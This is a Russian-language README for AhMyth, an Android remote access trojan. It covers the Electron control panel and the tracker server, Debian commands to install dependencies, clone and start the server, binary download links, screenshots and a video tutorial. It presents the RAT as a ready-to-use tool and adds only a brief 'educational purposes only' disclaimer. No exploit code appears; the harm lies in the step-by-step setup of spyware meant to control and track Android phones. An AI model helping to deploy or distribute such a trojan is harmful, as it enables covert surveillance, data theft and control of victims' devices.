# AhMyth Android Rat
###### Версия: Beta-2
* Серверная часть  : desktop приложение на Electron Framework (панель управления),
                     сервер-трекеров на базе Traccar (https://github.com/traccar/traccar)

* Клиентская часть : Android приложение, служба (RAT)


## НАЧАЛО РАБОТЫ
### Два вида установки
#### 1) Из исходного кода
###### Действия в системе Debian 10(desktop):
sudo apt install -y nodejs npm git curl libgconf-2-4
sudo apt istall -y wget gnupg software-properties-common

wget -qO - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | sudo apt-key add -
sudo add-apt-repository --yes https://adoptopenjdk.jfrog.io/adoptopenjdk/deb/
sudo apt update -y
sudo apt install adoptopenjdk-8-hotspot -y
sudo update-alternatives --config java

git clone https://github.com/elcaza/AhMyth-Android-RAT
cd AhMyth-Android-RAT/AhMyth-Server/
npm install 
npm start

#### 2) Из бинарников
###### Действия :
* Скачать по адресу https://github.com/AhMyth/AhMyth-Android-RAT/releases
* Установить Java

## Скриншоты
<p align="center">
  <img src="http://i.imgur.com/HM3uXL6.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
  <img src="http://i.imgur.com/nHTGGHi.png" width="600"/>
</p>

---------------------------------------------------------------

<p align="center">
  <img src="http://i.imgur.com/XVXCHV9.png" width="600"/>
</p>


## Видеоурок
<p align="center">
<a href="https://www.youtube.com/watch?v=DDIZTABABzs">
  <img src="https://img.youtube.com/vi/DDIZTABABzs/0.jpg" width="600"/>
</a></p>


---------------------------------------------------------------
##### I will not be responsible for any direct or indirect damage caused due to the usage of this tool, it is for educational purposes only.
##### Я не несу ответственности за любой прямой или косвенный ущерб, причиненный в результате использования этого инструмента, он предназначен только для образовательных целей.

